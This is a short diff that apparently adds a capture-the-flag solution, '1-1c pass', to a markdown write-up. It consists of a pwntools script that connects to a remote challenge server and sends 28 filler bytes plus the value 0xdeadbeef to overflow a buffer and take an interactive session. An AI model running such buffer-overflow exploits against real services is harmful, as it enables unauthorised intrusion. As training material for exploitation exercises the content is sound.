@@ -41,3 +41,19 @@ int main(){
   return 0;
 }
 ```
+```
+# 1-1c pass
+```
+# nc 120.114.62.213 6125
+from pwn import *
+
+#r = process('./pass')
+r = remote('120.114.62.213', 6125)
+
+payload = 'A'*28
+
+r.sendline(payload + p64(0xdeadbeef))
+
+r.interactive()
+```
+```
